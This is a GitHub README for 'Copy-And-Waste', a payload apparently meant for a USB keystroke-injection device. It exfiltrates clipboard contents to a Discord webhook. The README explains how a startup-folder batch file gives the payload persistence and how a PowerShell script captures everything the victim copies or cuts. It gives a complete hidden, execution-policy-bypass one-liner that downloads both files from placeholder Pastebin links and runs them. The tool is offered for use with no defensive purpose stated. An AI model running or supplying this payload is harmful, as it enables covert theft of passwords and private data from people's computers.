<img src="https://github.com/atomiczsec/My-Payloads/blob/main/Assets/caw.png" width="200">

<h1 align="center">
  <a href="https://git.io/typing-svg">
    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+;Copy+And+Waste!+😈&center=true&size=30">
  </a>
</h1>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Copy-And-Waste

A payload to exfiltrate clipboard contents

## Description

This payload uses iwr to download 2 files 
* I.bat
* c.ps1

**I.bat** is downloaded to the startup folder to maintain persistance and execute c.ps1 on reboot/startup

**c.ps1** will sit in AppData\Roaming folder, waiting for a Ctrl + C or Ctrl + X click 

Then the contents will then be sent to the discord webhook for viewing pleasure

For killing the script press both Ctrl buttons at the same time [It will resume at reboot]


## Getting Started

### Dependencies

* Pastebin or other file sharing service, Discord webhook or other webhook service
* Windows 10,11
* [Here](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) is a tutorial on how to use Discord webhooks 

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* Device will download both files and place them in proper directories to then run the script
```
powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1""
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here:

[atomiczsec](https://github.com/atomiczsec) &
[I-Am-Jakoby](https://github.com/I-Am-Jakoby)

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://www.youtube.com/channel/UC-7iJTFN8-CsTTuXd3Va6mA?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/atomiczsec">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>I-Am-Jakoby's Discord
    </td>
  </tr>
</table>
</div>

<p align="right">(<a href="#top">back to top</a>)</p>




<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [I-Am-Jakoby](https://github.com/I-Am-Jakoby)

<p align="right">(<a href="#top">back to top</a>)</p>
